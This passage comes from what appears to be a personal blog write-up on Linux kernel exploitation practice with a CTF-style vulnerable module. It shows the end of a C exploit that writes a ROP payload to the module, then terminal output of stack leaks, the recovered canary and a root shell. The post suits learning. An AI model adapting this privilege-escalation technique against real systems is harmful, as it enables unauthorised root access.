	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>


	<span class="c1">//payload[offset++] = (unsigned long) &amp;escalate_privs; // ret</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"[*] Sending payload..."</span><span class="p">);</span>
	
	<span class="kt">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">kernel_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>

	<span class="n">puts</span><span class="p">(</span><span class="s">"[!] This should never be reached"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Now when you recompress and run you should get root.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/ $ ./exploit_two
[+] Saved state
[*] Opened module
[*] Leak at index 0: 0xffffffff81a29330
[*] Leak at index 1: 0x12
[*] Leak at index 2: 0x63083951eb55a600
[*] Leak at index 3: 0xffff888006892210
[*] Leak at index 4: 0xffffc900001bfe68
[*] Leak at index 5: 0x4
[*] Leak at index 6: 0xffff888006892200
[*] Leak at index 7: 0xffffc900001bfef0
[*] Leak at index 8: 0xffff888006892200
[*] Leak at index 9: 0xffffc900001bfe80
[*] Leak at index 10: 0xffffffff8184e047
[*] Leak at index 11: 0xffffffff8184e047
[*] Leak at index 12: 0xffff888006892200
[*] Leak at index 13: 0x0
[*] Leak at index 14: 0x7ffcf2685e00
[*] Leak at index 15: 0xffffc900001bfea0
[*] Leak at index 16: 0x63083951eb55a600
[*] Leak at index 17: 0xa0
[*] Leak at index 18: 0x0
[*] Leak at index 19: 0xffffc900001bfed8
[*] Canary value: 0x63083951eb55a600
[*] Sending payload...
[*] uid: 0
[*] Spawning shell.
/ # id
uid=0 gid=0
/ # 
</code></pre></div></div>

<h3 id="exploit-three">Exploit Three</h3>

<p>Now for the third and final exploit, I will turn on KASLR. I have not done this yet but I will push my progress so far just because fuck it. Will update if I remember to.</p>

<h3 id="references">References</h3>

<p><a href="https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/">Low Level Adventures</a></p>


  </div>
</article>

<style>
.blog-post {
  max-width: 800px;
  margin: auto;
  padding: 20px;
}
.post-date {
  color: #777;
  font-size: 0.9rem;
  margin-bottom: 20px;
}
.post-content img {
  max-width: 100%;
}
</style>


  </main>

  <footer>
    <hr>
    © 2025 papichulo16
  </footer>
</body>
</html>

